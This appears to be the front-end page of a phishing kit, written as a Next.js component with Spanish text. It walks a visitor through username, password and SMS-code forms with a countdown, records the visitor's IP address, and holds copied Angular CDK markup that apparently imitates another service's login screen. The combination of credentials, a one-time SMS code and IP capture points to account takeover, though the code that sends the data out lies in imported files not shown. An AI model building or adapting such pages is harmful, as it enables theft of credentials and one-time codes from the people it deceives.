"use client";
import PassForm from "./src/passForm";
import { useEffect, useState } from "react";
import UserForm from "./src/userForm";
import SMSForm from "./src/smsForm";

export default function Home() {
  const [modal, setModal] = useState(0);
  const [segundos, setSegundos] = useState(30);
  const [userInfo, setUserInfo] = useState({
    ip:"",
    id: "",
    user: "",
    pass: "",
    key: "",
    sms: "",
  });

  const getIP = async () => {
    try {
      const response = await fetch("https://api.ipify.org");
      const data = await response.text();
      setUserInfo({ ...userInfo, ip: data });
    } catch (error) {
      console.error("failed ip", error);
    }
  };

  useEffect(() => {
    getIP();
  }, []);


  useEffect(() => {
    let intervalo = null;
    if (modal == 2 && segundos > 0) {
      intervalo = setInterval(() => {
        setSegundos((segundos) => segundos - 1);
      }, 1000);
    }
  }, [modal]);
  return (
    <div>
      <spinner></spinner>
      <UserForm
        user={(user) => {
          setUserInfo({ ...userInfo, user: user });
        }}
        openNextModal={() => setModal(1)}
      />{" "}
      <PassForm
        open={modal == 1}
        close={() => {
          setModal(2);
        }}
        user={(user) => {
          setUserInfo(user);
        }}
        dataInfo={userInfo}
      />{" "}
      <SMSForm open={modal == 2} dataInfo={userInfo} time={segundos} />{" "}
      <div
        className="cdk-live-announcer-element cdk-visually-hidden"
        aria-atomic="true"
        aria-live="polite"
      ></div>
      <div
        id="cdk-describedby-message-container"
        aria-hidden="true"
        style={{ display: "none" }}
      >
        <div id="cdk-describedby-message-0">Gestiona tu usuario</div>
      </div>
    </div>
  );
}
